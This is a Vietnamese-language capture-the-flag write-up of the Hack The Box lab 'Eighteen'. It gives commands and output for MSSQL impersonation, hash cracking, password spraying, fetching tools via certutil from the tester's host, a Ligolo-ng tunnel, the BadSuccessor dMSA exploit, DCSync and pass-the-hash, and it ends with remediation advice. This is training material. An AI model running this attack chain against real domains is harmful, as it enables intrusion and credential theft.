---
layout: post
title: HTB - Eighteen
difficulty: Easy
date: 2026-11-14
categories: [write-up, hackthebox]
tags: [mssql, dmsa, pivoting, tunneling]
attack_path:
  - node: kevin
    type: user
    edge: exec_as_login
  - node: appdev@mssql_DC01
    type: user
    edge: Password Spraying
  - node: adam.scott
    type: user
    edge: BadSuccessor
  - node: Administrator
    type: user
    edge: Domain Admins
  - node: EIGHTEEN.HTB
    type: domain
---

> Eighteen là một box hiếm hoi dùng Windows Server 2025 và giới thiệu đến chúng ta dMSA (Delegated Managed Service Account).
> Box này cũng chuẩn bị cho newbie những kỹ năng phải biết trong hành trình trở thành Hacker Lord.

## 1. Quyền Impersonate trong MSSQL

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Welcome - eighteen.htb
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2026-04-04T13:36:22+00:00; +7h00m01s from scanner time.
| ms-sql-info:
|   10.129.14.79:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-04T12:47:58
|_Not valid after:  2056-04-04T12:47:58
| ms-sql-ntlm-info:
|   10.129.14.79:1433:
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
```

Như output Nmap thì DC01 chỉ mở mỗi cổng 1433, trên version ghi rõ Microsoft SQL Server 2022.

> Rất nhiều box mở cổng này nhưng tôi hay gặp tình trạng quét Nmap lần đầu không thấy nó mở, nên tôi thường kiểm tra lại cho chắc bằng `nc -zv <IP> 1433`.

Chả có đường nào khác ngoài MSSQL rồi, mình truy cập vào với tài khoản được cấp sẵn:

```bash
~/HTB/Windows/Eighteen $ mssqlclient.py eighteen.htb/kevin:'iNa2we6haRj2gaw!'@DC01
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (kevin  guest@master)>
```

Và enum là điều mà ta không được skip, tôi sẽ thử enum 3 cái cơ bản trước là Quyền mạo danh, DB, và Linked Servers:

```bash
SQL (kevin  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev
SQL (kevin  guest@master)> enum_db
name                is_trustworthy_on
-----------------   -----------------
master                              0
tempdb                              0
model                               0
msdb                                1
financial_planner                   0
SQL (kevin  guest@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
--------   ----------------   -----------   --------------   ------------------   ------------   -------
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL
Linked Server   Local Login   Is Self Mapping   Remote Login
-------------   -----------   ---------------   ------------
```

> Nếu chưa lấy được thông tin gì hữu ích thì còn phải thử đọc file nội bộ, xp_cmdshell, xp_dirtree, ...

Ở đây Quyền mạo danh trả về cái tên `appdev`, `kevin` có quyền mạo danh anh ta ở cấp độ Server (EXECUTE AS LOGIN). Nghĩa là cả cái phiên MSSQL hiện tại của mình sẽ có thể biến thành `appdev` luôn.

> Còn có một loại khác là EXECUTE AS USER (cấp độ Database), ví dụ `kevin` ở đây đang nằm trong DB `master`, thì ta chỉ có thể mạo danh `appdev` trên `master` thôi.

`enum_db` trả về một cái DB không tiêu chuẩn là `financial_planner`, có thể `appdev` có quyền đọc cái DB này.

Để mạo danh thì ta dùng luôn lệnh `exec_as_login` của mssqlclient.py và liệt kê bảng của `financial_planner`:

```bash
SQL (kevin  guest@master)> exec_as_login appdev
SQL (appdev  appdev@master)> use financial_planner
ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.
SQL (appdev  appdev@financial_planner)> select name from sys.tables
name
-----------
users
incomes
expenses
allocations
analytics
visits
```

Thấy bảng `users` phát là mắt sáng liền:)

## 2. Tìm Cách Crack hash

Dump bảng `users` mình nhận được một cái hash của admin:

```bash
SQL (appdev  appdev@financial_planner)> select * from users
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03  
```

Hash này truyền vào Hashcat hoặc john thì nó báo không thấy hash nghĩa là ta phải đổi dạng hash này về dạng mà chúng nhận biết được. Để xem Hashcat muốn nó trông như nào thì dùng cờ `-H` và chỉ định mode `-m`:

```bash
~/HTB/Windows/Eighteen $ hashcat -H -m 10900
hashcat (v7.1.2) starting in hash-info mode

Hash Info:
==========

Hash mode #10900
  Name................: PBKDF2-HMAC-SHA256
  Category............: Generic KDF
  Slow.Hash...........: Yes
  Deprecated..........: No
  Deprecated.Notice...: N/A
  Password.Type.......: plain
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure
  Example.Hash.Format.: plain
  Example.Hash........: sha256:1000:NjI3MDM3:vVfavLQL9ZWjg8BUMq6/FB8FtpkIGWYk
  Example.Pass........: hashcat
  Benchmark.Mask......: ?a?a?a?a?a?a?a
  Autodetect.Enabled..: Yes
  Self.Test.Enabled...: Yes
  Potfile.Enabled.....: Yes
  Keep.Guessing.......: No
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX
```

Cả 2 phần salt và hash đều phải được mã hóa Base64, của admin là hash của Flask/Werkzeug với phần salt thuần túy và hash mã hóa Hex, ta phải mã hóa lại 2 cái này về Base64:

```bash
~/HTB/Windows/Eighteen $ echo AMtzteQIG7yAbZIa | base64
QU10enRlUUlHN3lBYlpJYQo=
~/HTB/Windows/Eighteen $ echo 0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133 | xxd -p -r | base64
BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

Ghép lại hash rồi crack:

```bash
~/HTB/Windows/Eighteen $ hashcat sha256:600000:QU10enRlUUlHN3lBYlpJYQ=:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM= /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
<SNIP>
sha256:600000:QU10enRlUUlHN3lBYlpJYQ=:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1
<SNIP>
```

Crack thành công được `iloveyou1`, lãng mạn nhỉ.

## 3. Password Spraying & User flag

Thử mật khẩu này với `appdev` và `admin`, `administrator` vào WinRM thì không được, LDAP và SMB cũng không mở ra ngoài, ta phải tìm cách nào đó lấy danh sách user để rải mật khẩu tiếp. Hãy yêu lấy NetExec vì cái cờ `--rid-brute` của nó đi:)

```bash
~/HTB/Windows/Eighteen $ nxc mssql DC01 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
MSSQL       10.129.14.79    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (EncryptionReq:False)
MSSQL       10.129.14.79    1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw!
<SNIP>
MSSQL       10.129.14.79    1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.129.14.79    1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.129.14.79    1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.129.14.79    1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.129.14.79    1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.129.14.79    1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.129.14.79    1433   DC01             1612: EIGHTEEN\dave.green
```

> Lưu ý `kevin` là user của MSSQL không phải user miền nên ta phải thêm cờ `--local-auth`.

Lưu tên họ vào một danh sách và rải bằng NetExec, trúng được cậu `adam.scott`:

```bash
~/HTB/Windows/Eighteen $ nxc winrm DC01 -u users.txt -p 'iloveyou1'
WINRM       10.129.14.79    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
WINRM       10.129.14.79    5985   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1
WINRM       10.129.14.79    5985   DC01             [-] eighteen.htb\jane.smith:iloveyou1
WINRM       10.129.14.79    5985   DC01             [-] eighteen.htb\alice.jones:iloveyou1
WINRM       10.129.14.79    5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```

> Vì một lý do nào đó `Pwn3d!` xuất hiện dù `adam.scott` không phải admin miền.

Đọc user flag:

```bash
~/HTB/Windows/Eighteen $ evil-winrm -i DC01 -u adam.scott -p iloveyou1
*Evil-WinRM* PS C:\Users\adam.scott\Documents> cat ..\Desktop\user.txt
466412bd4d0f96c4f11186ba74eba119
```

## 4. dMSA & BadSuccesstor

Kiểm tra nhanh quyền hạn nội bộ và nhóm thì `adam.scott` thuộc phòng IT, không có quyền nội bộ nào. IT thì chắc chắn có ACL hay ho rồi.

Mấy box Easy tôi khá lười pivot và tunnel nên tôi thường up PowerView.ps1 lên cho tiện:

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Documents> certutil -urlcache -f http://10.10.15.12/PowerView.ps1 PowerView.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.

*Evil-WinRM* PS C:\Users\adam.scott\Documents> Import-Module .\PowerView.ps1
```

Liệt kê quyền trong miền của IT:

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Documents> Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match "IT"}
ObjectDN                : OU=Staff,DC=eighteen,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1152179935-589108180-1989892463-1604
IdentityReferenceName   : IT
IdentityReferenceDomain : eighteen.htb
IdentityReferenceDN     : CN=IT,OU=Staff,DC=eighteen,DC=htb
IdentityReferenceClass  : group
```


Mình có quyền CreateChild lên OU `Staff`, hơn nữa máy này là Windows Server 2025. Nếu ta tra 2 cái này cùng nhau trên google thì BadSuccessor sẽ hiện ra ngay những dòng đầu. Đó là lỗ hổng của dMSA mang số hiệu CVE-2025-53779.

NetExec giờ đây cũng có module badsuccessor để phát hiện lỗ hổng này. Ở đây tôi bắn exploit của ibaiC mà tôi nhặt được trên github (https://github.com/ibaiC/BadSuccessor):

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Documents> certutil -urlcache -f http://10.10.15.12/BadSuccessor.exe BadSuccessor.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

*Evil-WinRM* PS C:\Users\adam.scott\Documents> .\BadSuccessor.exe escalate -targetOU "OU=Staff,DC=eighteen,DC=htb" -dmsa exploit -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname exploit -user adam.scott -dc-ip 127.0.0.1
<SNIP>
[*] Creating dMSA object...
[*] Inheriting target user privileges
    -> msDS-ManagedAccountPrecededByLink = CN=Administrator,CN=Users,DC=eighteen,DC=htb
    -> msDS-DelegatedMSAState = 2
[+] Privileges Obtained.
[*] Setting PrincipalsAllowedToRetrieveManagedPassword
    -> msDS-GroupMSAMembership = adam.scott
[+] Setting userAccountControl attribute
[+] Setting msDS-SupportedEncryptionTypes attribute

[+] Created dMSA 'exploit' in 'OU=Staff,DC=eighteen,DC=htb', linked to 'CN=Administrator,CN=Users,DC=eighteen,DC=htb' (DC: 127.0.0.1)
<SNIP>
```

Cái này nó chỉ tạo cho chúng ta một tài khoản dMSA thôi chứ chưa xin được luôn vé của nó để dùng.
Nó hướng dẫn mình cách dùng Rubeus để xin vé nhưng Rubeus đó phải đúng phiên bản commit gì gì đó nói chung là tôi thử mãi không được.

Chán quá vẫn phải pivot và tunnel thôi. Tải agent lên:

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Documents> certutil -urlcache -f http://10.10.15.12/agent.exe agent.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Bật proxy:

```bash
~/Ligolo-ng $ sudo ligolo-ng-proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
INFO[0000] Listening on 0.0.0.0:11601
<SNIP>
ligolo-ng »
```

Kết nối chúng với nhau:

```bash
*Evil-WinRM* PS C:\Users\adam.scott\Documents> .\agent.exe -connect 10.10.15.12:11601 -ignore-cert
```

Mở tunnel:

```bash
ligolo-ng » INFO[0018] Agent joined.                                 id=005056b9fe96 name="EIGHTEEN\\adam.scott@DC01" remote="10.129.14.79:54574"
ligolo-ng » session
? Specify a session : 1 - EIGHTEEN\adam.scott@DC01 - 10.129.14.79:54574 - 005056b9fe96
[Agent : EIGHTEEN\adam.scott@DC01] » start
INFO[0023] Starting tunnel to EIGHTEEN\adam.scott@DC01 (005056b9fe96)
```

Định tuyến và sync time với KDC luôn:

```bash
~/HTB/Windows/Eighteen $ sudo ip route add 240.0.0.1/32 dev ligolo
~/HTB/Windows/Eighteen $ ntpdate -s 240.0.0.1
```

Xin vé vàng `adam.scott` rồi xin vé bạc của dMSA với cờ `-self`

```bash
~/HTB/Windows/Eighteen $ getTGT.py eighteen.htb/adam.scott:iloveyou1
[*] Saving ticket in adam.scott.ccache

~/HTB/Windows/Eighteen $ export KRB5CCNAME=adam.scott.ccache

~/HTB/Windows/Eighteen $ getST.py -k -no-pass -dmsa eighteen.htb/adam.scott -impersonate 'exploit$' -self
[*] Impersonating exploit$
[*] Requesting S4U2self
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:e203d774d21e66e7a7540d97e3ceaf9b83dd2699a52692938f827fc8dbc5534d
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:1391dad64888291f024d06d2382f666d
[*] EncryptionTypes.rc4_hmac:2c8aeedec1f339175d56a352778c0fd0
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in exploit$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

> Cờ `-self` quan trọng nhé, thì cái vé bạc mình xin mới có token của user mà dMSA liên kết tới.

DCSync và húpp root flag:

```bash
~/HTB/Windows/Eighteen $ export KRB5CCNAME=exploit\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache

~/HTB/Windows/Eighteen $ secretsdump.py DC01 -k -no-pass -just-dc-user Administrator
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
[*] Kerberos keys grabbed
Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
Administrator:0x17:0b133be956bfaddf9cea56701affddec
[*] Cleaning up...
```

```powershell
~/HTB/Windows/Eighteen $ evil-winrm -i DC01 -u Administrator -H 0b133be956bfaddf9cea56701affddec
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
21e7bfd146bd9ebe79d758bf2dfbe19b
```

## Khắc phục

- Thu hồi ngay quyền IMPERSONATE thừa thãi trong MSSQL Server
- Buộc nhân viên sử dụng mật khẩu mạnh và đặc biệt không dùng lại mật khẩu.
- Xóa quyền CreatedChild của IT lên các OU quan trọng.
- Giám sát chặt chẽ các thuộc tính như msDS-ManagedAccountPrecededByLink và msDS-GroupMSAMembership để phát hiện kịp thời các liên kết bất thường.
